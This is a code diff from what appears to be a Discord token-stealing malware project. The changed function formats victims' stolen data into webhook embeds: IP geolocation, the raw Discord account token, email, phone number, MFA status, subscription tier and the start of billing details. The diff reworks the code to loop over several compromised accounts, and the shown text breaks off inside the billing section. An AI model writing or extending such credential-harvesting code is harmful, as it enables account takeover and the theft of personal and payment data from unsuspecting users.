@@ -30,62 +30,6 @@ const json = async (zipFile) => {
     ['Location', `[${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
     ['ISP', await ipInfo('isp')],
   ];
-  const discordAccountInfoFields = [
-    ['ID', discordAccountInfo.account.id],
-    ['Bio', discordAccountInfo.account.bio],
-    ['Locale', discordAccountInfo.account.locale],
-    ['NSFW Allowed', discordAccountInfo.account.nsfw_allowed],
-    ['MFA Enabled', discordAccountInfo.account.mfa_enabled],
-    ['Email', discordAccountInfo.account.email || 'No Email'],
-    ['Email Verified', discordAccountInfo.account.verified],
-    ['Phone Number', discordAccountInfo.account.phone || 'No Phone Number'],
-    ['Nitro Subscription', (() => { switch (discordAccountInfo.account.premium_type) {
-      case 0:
-        return 'No Nitro';
-      case 1:
-        return 'Nitro Classic';
-      case 2:
-        return 'Nitro';
-      case 3:
-        return 'Nitro Basic';
-      default:
-        return 'No Nitro';
-    } })()],
-    /*['Flags', (() => { let flags = []; switch (discordAccountInfo.account.flags) {
-      case 1 << 0:
-        flags.push('Staff'); break;
-      case 1 << 1:
-        flags.push('Partner'); break;
-      case 1 << 2:
-        flags.push('HypeSquad'); break;
-      case 1 << 3:
-        flags.push('Bug Hunter (Level 1)'); break;
-      case 1 << 6:
-        flags.push('HypeSquad (House 1)'); break;
-      case 1 << 7:
-        flags.push('HypeSquad (House 2)'); break;
-      case 1 << 8:
-        flags.push('HypeSquad (House 3)'); break;
-      case 1 << 9:
-        flags.push('Early Supporter'); break;
-      case 1 << 10:
-        flags.push('Team User'); break;
-      case 1 << 14:
-        flags.push('Bug Hunter (Level 2)'); break;
-      case 1 << 16:
-        flags.push('Verified Bot'); break;
-      case 1 << 17:
-        flags.push('Verified Developer'); break;
-      case 1 << 18:
-        flags.push('Certified Moderator'); break;
-      case 1 << 19:
-        flags.push('Bot HTTP Interactions'); break;
-      case 1 << 22:
-        flags.push('Active Developer'); break;
-      default:
-        return 'No Flags';
-    } return flags.join(', '); })()],*/
-  ];
 
   const embeds = [
     {
@@ -95,18 +39,72 @@ const json = async (zipFile) => {
     {
       title: 'IP Info',
       fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
-    },
-    {
-      title: 'Discord Account',
-      description: `Token: \`\`\`\n${discordAccountInfo.account.token}\n\`\`\``,
-      author: {
-        name: `${discordAccountInfo.account.username}#${discordAccountInfo.account.discriminator}`,
-        icon_url: `https://cdn.discordapp.com/avatars/${discordAccountInfo.account.id}/${discordAccountInfo.account.avatar}.${discordAccountInfo.account.avatar.startsWith('a_') ? 'gif' : 'png'}`
-      },
-      fields: discordAccountInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; }),
-      color: discordAccountInfo.account.accent_color,
-    },
+    }
   ];
+  discordAccountInfo.accounts.forEach(account => { embeds.push({
+    description: `Token: \`\`\`\n${account.token}\n\`\`\``,
+    author: {
+      name: `${account.username}#${account.discriminator}`,
+      icon_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.${account.avatar.startsWith('a_') ? 'gif' : 'png'}`
+    },
+    fields: [
+      ['ID', account.id],
+      ['Bio', account.bio],
+      ['Locale', account.locale],
+      ['NSFW Allowed', account.nsfw_allowed],
+      ['MFA Enabled', account.mfa_enabled],
+      ['Email', account.email || 'No Email'],
+      ['Email Verified', account.verified],
+      ['Phone Number', account.phone || 'No Phone Number'],
+      ['Nitro Subscription', (() => { switch (account.premium_type) {
+        case 0:
+          return 'No Nitro';
+        case 1:
+          return 'Nitro Classic';
+        case 2:
+          return 'Nitro';
+        case 3:
+          return 'Nitro Basic';
+        default:
+          return 'No Nitro Subscription';
+      } })()],
+      /*['Flags', (() => { let flags = []; switch (account.flags) {
+        case 1 << 0:
+          flags.push('Staff'); break;
+        case 1 << 1:
+          flags.push('Partner'); break;
+        case 1 << 2:
+          flags.push('HypeSquad'); break;
+        case 1 << 3:
+          flags.push('Bug Hunter (Level 1)'); break;
+        case 1 << 6:
+          flags.push('HypeSquad (House 1)'); break;
+        case 1 << 7:
+          flags.push('HypeSquad (House 2)'); break;
+        case 1 << 8:
+          flags.push('HypeSquad (House 3)'); break;
+        case 1 << 9:
+          flags.push('Early Supporter'); break;
+        case 1 << 10:
+          flags.push('Team User'); break;
+        case 1 << 14:
+          flags.push('Bug Hunter (Level 2)'); break;
+        case 1 << 16:
+          flags.push('Verified Bot'); break;
+        case 1 << 17:
+          flags.push('Verified Developer'); break;
+        case 1 << 18:
+          flags.push('Certified Moderator'); break;
+        case 1 << 19:
+          flags.push('Bot HTTP Interactions'); break;
+        case 1 << 22:
+          flags.push('Active Developer'); break;
+        default:
+          return 'No Flags';
+      } return flags.join(', '); })()],*/
+    ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
+    color: account.accent_color,
+  }); });
   discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
     title: `Discord Account - Billing - ${(() => { switch (billing.type) {
       case 1:
